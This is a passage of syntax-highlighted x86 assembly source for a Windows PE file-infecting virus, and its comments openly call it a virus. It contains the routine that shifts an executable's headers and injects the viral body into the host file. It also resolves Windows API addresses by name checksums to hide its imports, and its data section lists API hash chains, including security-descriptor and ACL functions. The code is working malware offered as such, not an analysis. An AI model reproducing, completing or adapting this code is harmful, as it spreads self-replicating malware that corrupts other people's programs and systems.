                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_SECTION_HEADER.PointerToRawData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; add displacement :)</span><span class="sc0">

</span><span class="sc5">DontUpdateIMAGE_SECTION_HEADER</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">IMAGE_SECTION_HEADER_size</span><span class="sc0">       </span><span class="sc1">; advance to next section header</span><span class="sc0">
                                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; and go on till we finish all the sections</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">UpdateIMAGE_SECTION_HEADERs</span><span class="sc0">

                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; bring back the righteous exe size ( last non bss sectionïs offset+size )</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; Is there an overlay in the EXE file ? ( last ( non bss ) sectionïs PointerToRawData+SizeOfRawData != fileïs size )</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ErrorInfectingFile</span><span class="sc0">   </span><span class="sc1">; if there is, exit :|</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; we need to move the whole original header backwards, ECX is the amount of bytes to move</span><span class="sc0">

                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; the new header will be enlarged, cos it needs to count on virus size too };</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; new size of the file: Previous file size+virus size</span><span class="sc0">

                                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; we are moving by DWORDs, so we divide ECX by 4</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; remember EBX has file contentïs address</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; so ESI takes EBXïs value and edi takes EBXïs value minus Virus size</span><span class="sc0">
                                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; so we will inject the virus just in between :))</span><span class="sc0">
                                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">       </span><span class="sc1">; and we do the moving</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; we now have to fiiiinaaaally move or inject our virus :DD</span><span class="sc0">
                                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; so we move virus size / 4 amount of DWORDs</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">; remember our mighty friend DeltaHandle ? we will read from it too, ooohhh we overabuse its usage ( little kiss for you DH :* ) xDDD</span><span class="sc0">
                                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">       </span><span class="sc1">; moveeeee! ( inject )</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; the code piece that calls us expects us to return with ESI=offset from where to write to file and EDI=new file size ( or bytes that will be written to the file ).</span><span class="sc0">
                                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Previous file contentïs address minus virus size ( we displaced that amount of bytes backwards cos we needed the space to inject virus code )</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; so as we said, EDI takes EDX, that had previous files size+virus size ( new file size )</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; we restore ebx, cos we where supposed to preserve it O:)</span><span class="sc0">

                                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ErrorInfectingFile</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; ooooppsss :S, what happened ? :( well just mark error by EDI=0 and exit</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; we restore ebx for the same reason</span><span class="sc0">

                                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ROUTINES</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; ESI &lt; PE HEADER</span><span class="sc0">
</span><span class="sc1">;; EDX &lt; RVA</span><span class="sc0">
</span><span class="sc1">;; EDX &gt; PHYSICAL OFFSET OF THE RVA INTO THE FILE OR 0 IF ERROR.</span><span class="sc0">
</span><span class="sc5">ConvertRVAToPhysicalOffset</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetRVAsSectionHeader</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorGettingRVAsSectionHeader</span><span class="sc0">

                                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_SECTION_HEADER.VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_SECTION_HEADER.PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">ErrorGettingRVAsSectionHeader</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; ESI &lt; PE HEADER</span><span class="sc0">
</span><span class="sc1">;; EDX &lt; RVA</span><span class="sc0">
</span><span class="sc1">;; EDX &gt; SECTION HEADER OF THE SECTION WHERE THE RVA IS OR 0 IF ERROR.</span><span class="sc0">
</span><span class="sc5">GetRVAsSectionHeader</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.FileHeader.NumberOfSections</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_FILE_HEADER_size</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; +4 for the PE,0,0 signature size</span><span class="sc0">

</span><span class="sc5">RVAsSectionSearchLoop</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_SECTION_HEADER.VirtualAddress</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">NoRVAsSection</span><span class="sc0">

                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_SECTION_HEADER.SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">RVAsSectionFound</span><span class="sc0">

</span><span class="sc5">NoRVAsSection</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">IMAGE_SECTION_HEADER_size</span><span class="sc0">
                                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">RVAsSectionSearchLoop</span><span class="sc0">

                                </span><span class="sc6">cdq</span><span class="sc0">     </span><span class="sc1">; set edx=0 to indicate error</span><span class="sc0">
                                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">RVAsSectionNotFound</span><span class="sc0">

</span><span class="sc5">RVAsSectionFound</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">RVAsSectionNotFound</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; EBX &lt; CLUE ( ADDRESS ABOVE THE BASE ) </span><span class="sc0">
</span><span class="sc1">;; EAX &lt; ALIGNMENT</span><span class="sc0">
</span><span class="sc1">;; EBX &gt; MODULE BASE</span><span class="sc0">
</span><span class="sc5">SolveModuleBase</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">TryNextModuleBaseChance</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ModuleBaseFound</span><span class="sc0">
                                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">TryNextModuleBaseChance</span><span class="sc0">

</span><span class="sc5">ModuleBaseFound</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; ESI &lt; STRING</span><span class="sc0">
</span><span class="sc1">;; EAX &gt; CRC32</span><span class="sc0">
</span><span class="sc5">GetStringsCRC32</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">CRC32SumUpLoop</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">lodsd</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CRC32End1</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CRC32End2</span><span class="sc0">

                                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CRC32End3</span><span class="sc0">

                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CRC32End4</span><span class="sc0">

                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CRC32SumUpLoop</span><span class="sc0">

</span><span class="sc5">CRC32End2</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000FFh</span><span class="sc0">
</span><span class="sc5">CRC32End3</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000FFFFh</span><span class="sc0">
</span><span class="sc5">CRC32End4</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00FFFFFFh</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">CRC32End1</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; EBX &lt; MODULE BASE</span><span class="sc0">
</span><span class="sc1">;; EDI &lt; ARRAY THAT WILL WE FILLED WITH SOLVED ADDRESSES </span><span class="sc0">
</span><span class="sc1">;; ESI &lt; 0 TERMINATED CRC32 CHAIN OF THE EXPORTS TO IMPORT</span><span class="sc0">
</span><span class="sc5">SolveModuleExports</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.e_lfanew</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_NT_HEADERS.OptionalHeader.DataDirectory</span><span class="sc4">+</span><span class="sc5">IMAGE_DATA_DIRECTORY_size</span><span class="sc4">*</span><span class="sc5">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="sc4">+</span><span class="sc5">IMAGE_DATA_DIRECTORY.VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">SolveNextExport</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExportChainEnd</span><span class="sc0">

</span><span class="sc5">TryNextExportChance</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_EXPORT_DIRECTORY.AddressOfNames</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetStringsCRC32</span><span class="sc0">

                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CurrentExportFound</span><span class="sc0">

                                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">TryNextExportChance</span><span class="sc0">

</span><span class="sc5">CurrentExportFound</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_EXPORT_DIRECTORY.AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

                                </span><span class="sc6">stosd</span><span class="sc0">

                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                                </span><span class="sc6">lodsd</span><span class="sc0">   </span><span class="sc1">; just an ESI+=4</span><span class="sc0">

                                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SolveNextExport</span><span class="sc0">

</span><span class="sc5">ExportChainEnd</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; DATA</span><span class="sc0">

</span><span class="sc5">OBJ_CASE_INSENSITIVE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">

</span><span class="sc5">GRANT_ACCESS</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> 
</span><span class="sc5">NO_INHERITANCE</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">TRUSTEE_IS_NAME</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">TRUSTEE_IS_USER</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">NO_MULTIPLE_TRUSTEE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SE_KERNEL_OBJECT</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">

</span><span class="sc5">NonPagedPool</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PagedPool</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">FILE_SYNCHRONOUS_IO_NONALERT</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000020h</span><span class="sc0">
</span><span class="sc5">FILE_NON_DIRECTORY_FILE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">

</span><span class="sc5">FileStandardInformation</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">


</span><span class="sc5">CRC32OfExitProcess</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'Exit'</span><span class="sc4">+</span><span class="sc12">'Proc'</span><span class="sc4">+</span><span class="sc12">'ess'</span><span class="sc0">


</span><span class="sc1">; APIsï CRC32 Chains</span><span class="sc0">

</span><span class="sc5">KERNEL32ApiCRC32s</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'SetT'</span><span class="sc4">+</span><span class="sc12">'hrea'</span><span class="sc4">+</span><span class="sc12">'dPri'</span><span class="sc4">+</span><span class="sc12">'orit'</span><span class="sc4">+</span><span class="sc12">'y'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'Loca'</span><span class="sc4">+</span><span class="sc12">'lFre'</span><span class="sc4">+</span><span class="sc12">'e'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'Clos'</span><span class="sc4">+</span><span class="sc12">'eHan'</span><span class="sc4">+</span><span class="sc12">'dle'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'Virt'</span><span class="sc4">+</span><span class="sc12">'ualL'</span><span class="sc4">+</span><span class="sc12">'ock'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'Virt'</span><span class="sc4">+</span><span class="sc12">'ualU'</span><span class="sc4">+</span><span class="sc12">'nloc'</span><span class="sc4">+</span><span class="sc12">'k'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'Slee'</span><span class="sc4">+</span><span class="sc12">'p'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'Load'</span><span class="sc4">+</span><span class="sc12">'Libr'</span><span class="sc4">+</span><span class="sc12">'aryA'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ADVAPI32ApiCRC32s</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'GetS'</span><span class="sc4">+</span><span class="sc12">'ecur'</span><span class="sc4">+</span><span class="sc12">'ityI'</span><span class="sc4">+</span><span class="sc12">'nfo'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'SetS'</span><span class="sc4">+</span><span class="sc12">'ecur'</span><span class="sc4">+</span><span class="sc12">'ityI'</span><span class="sc4">+</span><span class="sc12">'nfo'</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'SetE'</span><span class="sc4">+</span><span class="sc12">'ntri'</span><span class="sc4">+</span><span class="sc12">'esIn'</span><span class="sc4">+</span><span class="sc12">'AclA'</span><span class="sc0">
